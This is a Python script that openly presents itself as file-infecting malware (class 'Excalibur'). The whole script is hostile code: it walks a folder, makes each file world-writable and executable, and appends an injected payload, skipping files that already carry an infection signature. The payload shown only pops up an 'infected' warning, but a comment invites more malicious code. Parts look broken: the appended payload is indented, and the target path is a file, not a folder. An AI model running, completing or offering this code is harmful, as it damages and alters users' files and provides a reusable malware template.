#!/usr/bin/env python3

""" Implementation of file infector in Python.
    INJECTION SIGNATURE
"""

import logging
import os
import sys
from cached_property import cached_property
import tkinter as tk
from tkinter import messagebox


class Excalibur:
    """ This class represents the code injecting malware.
    """

    def __init__(self, name):
        self._name = name

    @property
    def name(self):
        """ Name of the malware. """
        return self._name

    @name.setter
    def name(self, new_name):
        self._name = new_name

    @cached_property
    def malicious_code(self):

        malicious_code = '''
    import tkinter as tk
    from tkinter import messagebox

    def show_warning():
        root = tk.Tk()
        root.withdraw()
        messagebox.showwarning("Warning", "This file has been infected!")

    show_warning()

    # Your additional malicious code goes here
    '''
        return malicious_code

    def infect_files_in_folder(self, path):
        """ Perform file infection on all files in the
        given directory specified by path.
        :param str path: Path of the folder to be infected.
        :returns: Number of injected files (`int`).
        """
        num_infected_files = 0
        # List the directory to get all files.
        files = []
        for file in os.listdir(path):
            # Exclude specific files from being infected
            if file in ['file1.txt', 'file2.py', 'file3.exe']:
                continue

            file_path = os.path.join(path, file)
            if os.path.isfile(file_path):
                files.append(file_path)

        # Inject each file in the directory.
        for file in files:
            logging.debug('Infecting file: {}'.format(file))

            # Read the content of the original file.
            with open(file, 'r') as infected_file:
                file_content = infected_file.read()
            # Check whether the file was already infected by scanning
            # the injection signature in this file. If so, skip the file.
            if "INJECTION SIGNATURE" in file_content:
                continue

            # Ensure that the injected file is executable.
            os.chmod(file, 0o777)  # Change the mode to make it executable

            # Write the original and malicious part into the file.
            with open(file, 'w') as infected_file:
                infected_file.write(file_content + self.malicious_code)

            num_infected_files += 1

        return num_infected_files


if __name__ == '__main__':
    logging.basicConfig(level=logging.DEBUG)

    # Create file injector.
    code_injector = Excalibur('Excalibur')

    # Infect files in the specified folder.
    path = r"C:\Users\Intern 11\Testing123\MyText.txt"  # Update the folder path here
    NUMBER_INFECTED_FILES = code_injector.infect_files_in_folder(path)

    logging.info('Number of infected files: {}'.format(NUMBER_INFECTED_FILES))
